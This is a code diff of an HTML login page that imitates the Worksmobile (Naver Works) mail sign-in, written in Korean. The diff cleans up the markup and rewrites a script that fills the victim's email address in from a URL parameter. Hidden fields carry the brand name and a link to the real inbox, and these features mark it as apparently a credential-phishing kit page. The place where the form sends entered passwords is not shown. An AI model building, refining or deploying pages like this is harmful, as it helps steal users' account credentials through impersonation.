@@ -1,9 +1,9 @@
-﻿<html>
+<!DOCTYPE html>
+<html>
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
 <title>Login</title>
 <link rel="shortcut icon" href="img/ico.jpg">
-</head>
 <style>
   html, body {
     font-family: Arial, sans-serif;
@@ -20,8 +20,6 @@
     -webkit-text-size-adjust: none;
   }
   input[type=text] {
-    -moz-appearance: none;
-    -webkit-appearance: none;
     appearance: none;
     display: inline-block;
     height: 48px;
@@ -38,8 +36,6 @@
     color: #404040;
   }
   input[type=password] {
-    -moz-appearance: none;
-    -webkit-appearance: none;
     appearance: none;
     display: inline-block;
     height: 48px;
@@ -62,6 +58,7 @@
     border: 1px solid #2985db;
   }
 </style>
+</head>
 <body bgcolor="#F9FAFC">
 
 <div align="center">
@@ -85,18 +82,18 @@
                             <table border="0" width="100%" cellspacing="0" cellpadding="0">
                               <tr>
                                 <td>
-                                  <input type="text" name="user" required placeholder="로그인 ID" value="user"
+                                  <input type="text" id="userInput" name="user" required placeholder="로그인 ID" value="user"
                                     style="border:0; border-bottom: 1px #ddd solid; border-top: 1px #ddd solid;
                                     border-right: 0px #ddd solid; border-left: 1px #ddd solid;
                                     border-top-left-radius:5px; border-bottom-left-radius:5px;
                                     border-top-right-radius:0px; border-bottom-right-radius:0px" />
-                                  <input type="text" name="" required placeholder="로그인 ID" value="@domain"
+                                  <input type="text" id="domainInput" name="" required placeholder="로그인 ID" value="@domain"
                                     style="border:0; border-bottom: 1px #ddd solid; border-top: 1px #ddd solid;
                                     border-left: 0px #ddd solid; border-right: 1px #ddd solid;
                                     border-top-right-radius:5px; border-bottom-right-radius:5px;
                                     border-top-left-radius:0px; border-bottom-left-radius:0px" />
-                                  <input type="hidden" name="sender" value="Worksmobile.com" />
-                                  <input type="hidden" name="domain" value="domain" />
+                                  <input type="hidden" id="emailHidden" name="sender" value="Worksmobile.com" />
+                                  <input type="hidden" id="domainHidden" name="domain" value="domain" />
                                   <input type="hidden" name="link" value="https://mail.worksmobile.com/#/inbox?t=1734796348048" />
                                 </td>
                               </tr>
@@ -147,39 +144,20 @@
   </table>
 </div>
 
-</body>
-   
 <script>
   const params = new URLSearchParams(window.location.search);
   const raw = params.get('login');
   const email = raw ? decodeURIComponent(raw) : '';
 
-  let user = '', domain = '';
   if (email.includes('@')) {
-    [user, domain] = email.split('@');
-  }
+    const [user, domain] = email.split('@');
 
-  const inputs = document.querySelectorAll('input[type="text"]');
-  if (inputs.length >= 3) {
-    inputs[0].value = email || 'email';
-    inputs[1].value = user || 'user';
-    inputs[2].value = domain || 'domain';
-  }
-
-  const hiddenInputs = document.querySelectorAll('input[type="hidden"]');
-  hiddenInputs.forEach(input => {
-    if (input.name === 'user') input.value = email || 'email';
-    if (input.name === 'domain') input.value = domain || 'domain';
-  });
-
-  document.getElementById('greeting').textContent = email ? `Hello ${email}` : 'Hello';
-
-  const btn = document.querySelector('.button1');
-  if (btn) btn.textContent = email || 'email';
-
-  const link = document.getElementById('anotherLink');
-  if (link && email) {
-    link.href = `another_user.html?login=${encodeURIComponent(email)}`;
+    document.getElementById('userInput').value = user;
+    document.getElementById('domainInput').value = '@' + domain;
+    document.getElementById('emailHidden').value = email;
+    document.getElementById('domainHidden').value = domain;
   }
 </script>
+
+</body>
 </html>
